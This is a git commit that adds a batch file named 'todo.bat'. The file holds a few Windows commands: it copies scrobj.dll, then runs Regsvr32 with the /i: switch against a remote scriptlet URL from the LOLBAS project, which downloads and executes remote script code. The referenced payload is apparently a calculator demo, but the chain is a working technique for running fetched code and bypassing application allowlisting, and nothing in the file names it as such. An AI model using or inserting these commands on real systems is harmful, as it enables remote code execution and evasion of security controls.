351e567003112814648a443032524290f9b664d9
markm-cs <119330321+markm-cs@users.noreply.github.com>
2022-11-28 15:02:38 +0000

    Create todo.bat

---
+++ todo.bat
@@ -0,0 +1,5 @@
+copy c:\windows\system32\scrobj.dll newfile.dll
+
+Regsvr32.exe /u /s /i:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Regsvr32_calc.sct [raw.githubusercontent.com]
+
+newfile.dll
